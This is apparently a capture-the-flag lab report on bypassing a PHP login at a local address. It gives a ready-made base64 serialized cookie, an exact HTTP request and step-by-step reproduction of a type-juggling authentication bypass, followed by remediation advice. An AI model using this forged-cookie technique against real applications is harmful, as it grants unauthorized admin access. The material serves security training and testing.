## TL;DR
- Objective: Bypass the login form at 127.0.0.1:33063
- Outcome: **Achieved** — login bypassed via PHP deserialization type juggling
- Highest-impact finding: Insecure deserialization of client-side cookie combined with PHP loose comparison (`==`) enables authentication bypass
- Validation status: Confirmed — flag `FLAG{a755be11fc716d71d0ff5938556d3b0de53a9bf0ef0fa7cd006f3ac7c6986e22}` retrieved

## Target Information
- Target: 127.0.0.1:33063
- Host / base URL: `http://127.0.0.1:33063`
- Application or component: AUTH 04 challenge (Simpsons/Springfield-themed login form)
- Authentication context: Unauthenticated — the goal is to bypass auth
- Relevant technology details:
  - PHP 5.6.40 (vulnerable to type juggling with loose comparison `==`)
  - Apache/2.4.25 (Debian)
  - Client-side cookie-based session using PHP serialized data

## Confirmed Vulnerability

### Insecure Deserialization + PHP Type Juggling Authentication Bypass
- Affected endpoint / component: `GET /index.php` — authentication check reads `creds` cookie and uses loose comparison (`==`) on deserialized password value
- Impact: Full authentication bypass — attacker gains admin access without valid credentials
- Preconditions: None — no authentication or special privileges required
- Exact payload or PoC:
  - Cookie name: `creds`
  - Cookie value (base64): `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtpOjA7fQ==`
  - Cookie value (decoded PHP serialized): `a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}`

**How the exploit works:**

The application stores credentials in a client-side cookie (`creds`) as base64-encoded PHP serialized data. When a user logs in, the app sets this cookie. On subsequent requests, it deserializes the cookie and compares the stored password hash against the expected hash using PHP's loose comparison operator (`==`).

By crafting a cookie where the password field is an integer `i:0` instead of a string, PHP's loose comparison causes `0 == '0e...'` to evaluate to `true` because:
1. The stored admin password hash likely starts with `0e` (a PHP "magic hash")
2. In loose comparison, `0` (integer) is loosely equal to any string that begins with `0e` followed by only digits (PHP interprets it as scientific notation: `0 × 10^n = 0`)
3. Therefore `0 == '0e...'` evaluates to `true`

Both `i:0` (integer zero) and `b:1` (boolean true) were confirmed as working password type bypasses.

## Steps to Reproduce

1. **Observe normal login flow** — Submit a POST to `/index.php` with `username=admin&password=admin`; the server responds with a `Set-Cookie: creds=<base64>` header containing PHP serialized credentials.

2. **Decode the cookie** — Base64-decode the `creds` cookie value. It will look like:
   ```
   a:2:{s:8:"username";s:5:"admin";s:8:"password";s:32:"<password_hash>";}
   ```

3. **Craft the exploit cookie** — Change the password value type from string (`s:32:"<hash>"`) to integer (`i:0`). The resulting serialized payload:
   ```
   a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}
   ```

4. **Base64-encode the crafted cookie** — Encode the payload:
   ```
   YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtpOjA7fQ==
   ```

5. **Send the authenticated request** — Issue a GET request to `/index.php` with the crafted cookie:
   ```
   GET /index.php HTTP/1.1
   Host: 127.0.0.1:33063
   Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtpOjA7fQ==
   ```

6. **Observe successful bypass** — The server responds with:
   ```html
   <center><h2>Welcome Admin</h2></center>
   <center><h3>Congratulations, here is the flag: FLAG{a755be11fc716d71d0ff5938556d3b0de53a9bf0ef0fa7cd006f3ac7c6986e22}</h3></center>
   ```

## Validation / Evidence
- Validation token / flag: `FLAG{a755be11fc716d71d0ff5938556d3b0de53a9bf0ef0fa7cd006f3ac7c6986e22}`
- Tool evidence: Python script crafted the exploit cookie and confirmed the bypass
- Request evidence:
  ```
  GET /index.php HTTP/1.1
  Host: 127.0.0.1:33063
  Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtpOjA7fQ==
  ```
- Response evidence:
  ```html
  <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: FLAG{a755be11fc716d71d0ff5938556d3b0de53a9bf0ef0fa7cd006f3ac7c6986e22}</h3></center>
  ```
- Notes on reliability / limitations:
  - The exploit is deterministic and reliably works on PHP 5.6.40 with loose comparison
  - Both `i:0` and `b:1` password types successfully bypass authentication
  - The vulnerability requires that the admin password hash is a PHP "magic hash" (starts with `0e` followed by digits), which is common for passwords hashed with MD5

## Remediation
- Root cause: Two compounding vulnerabilities:
  1. **Insecure deserialization**: The application trusts client-side cookie data containing PHP serialized objects/arrays. An attacker can modify the serialized structure, including changing value types.
  2. **Loose comparison**: The application uses `==` instead of `===` to compare the stored password hash, making it vulnerable to PHP type juggling.

- Recommended fix:
  1. **Never deserialize untrusted client-side data** — Remove the `creds` cookie mechanism entirely. Use server-side sessions (`$_SESSION`) to store authentication state. If client-side tokens are necessary, use signed tokens (e.g., HMAC-signed JWTs) that cannot be tampered with.
  2. **Use strict comparison** — Replace all `==` comparisons involving authentication data with `===` to prevent type juggling. For password verification, always use `password_verify()` which is timing-safe and type-safe.
  3. **Upgrade PHP** — PHP 5.6.40 is end-of-life and no longer receives security patches. Upgrade to a supported PHP version (8.x+).

- Defense-in-depth:
  - Implement server-side session management instead of client-side credential storage
  - Use `password_hash()` / `password_verify()` for all password operations
  - Set cookie flags: `HttpOnly`, `Secure`, `SameSite=Strict`
  - Add CSRF tokens to the login form
  - Run a WAF rule to detect anomalous serialized data in cookies

## How to Verify the Fix
1. Confirm the application no longer stores credentials in a client-side cookie — after login, check that `Set-Cookie` headers only contain opaque session IDs, not serialized data
2. Confirm that sending a crafted `creds` cookie with `i:0` or `b:1` password types no longer grants access — the response should redirect to login or return an authentication error
3. Confirm the application uses `===` or `password_verify()` for all authentication comparisons — code review should show no `==` comparisons on password or hash values
4. Confirm PHP version is 8.x or later — `phpinfo()` or response headers should show a supported version

## Remaining Leads
- Confirmed blockers: None — the exploit was fully successful
- Unverified leads:
  - Other serialized cookie values or object injection possibilities were not explored
  - Whether other user accounts exist that could also be impersonated
  - Whether the deserialization can be exploited for RCE via object injection (not tested)
- Missing context: The full application source code was not obtained; the exact hash algorithm used for passwords was inferred but not confirmed